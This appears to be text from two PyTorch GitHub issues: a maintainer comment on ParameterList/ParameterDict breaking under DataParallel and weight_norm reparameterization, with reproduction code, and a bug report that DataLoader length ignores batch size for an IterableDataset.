When the nn.Module X is wrapped with nn.DataParallel, both nn.Module and nn.Parameter in X should be copied to gpus.

## Environment

Is debug build: No

OS: Arch Linux
GCC version: (Arch Linux 9.3.0-1) 9.3.0

[ngimel]: @mrshenli not really. In case of ParameterList/ParameterDict #33907 exposed a deficiency in ParameterList/ParameterDict design that already made them incompatible with reparameterization, see e.g. the following example where ParameterList fails without any data_parallel replication:
```
import torch
import torch.nn as nn

class MyMod(torch.nn.Module):
    def __init__(self):
        super(MyMod, self).__init__()
        self.params = nn.ParameterList([nn.Parameter(torch.randn(10, 10)) for i in range(10)])

    def forward(self, x):
        print( self.params[0].size())
        # ParameterList can act as an iterable, or be indexed using ints
        for i, p in enumerate(self.params):
            x = self.params[i // 2].mm(x) + p.mm(x)
        return x

m = MyMod()
torch.nn.utils.weight_norm(m.params, name="0")
print("applied weight norm")
x = torch.randn(10, 10)
out=m(x)
```
Note that while one should not access `parameters()` in the forward pass (and this is the only thing that #33907 breaks), and accessing them by attribute name works even after #33907, accessing elements of ParameterList by index is the sole purpose of its existence, and the only way to access those attributes, and yet it does not work after a regular reparameterization. ParameterList/ParameterDict happened to work with data parallel replication before #33907 because it hid the fact that it was, in fact, reparameterization, but the proper fix is to make ParameterList/ParameterDict behave correctly in reparameterization scenarios.

body:
## 🐛 Bug

The length of a `DataLoader` when using a map `Dataset` is the defined by the sampler, usually defaulting to `BatchSampler`'s method which divides the number of examples in the dataset by the batch size. When using an `IterableDataset` it just returns `len(IterableDataset)`, rather than `len(IterableDataset) // batch_size`. If the `IterableDataset` defines `__len__`, and `loader.batch_size > 0` then the loader will only ever return `len(IterableDataset) // batch_size` batches, so the loader should return this as it's length. This occurs with single process data loading, I understand that multiprocess has other complexities which will cause this to fail in other ways.

## Expected behavior

`len(loader) == (len(dataset) // batch_size)`

## Environment

 - PyTorch Version (e.g., 1.0): 1.4.0
 - OS (e.g., Linux): Linux
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Python version: 3.6
 - CUDA/cuDNN version: n/a
 - GPU models and configuration: n/a
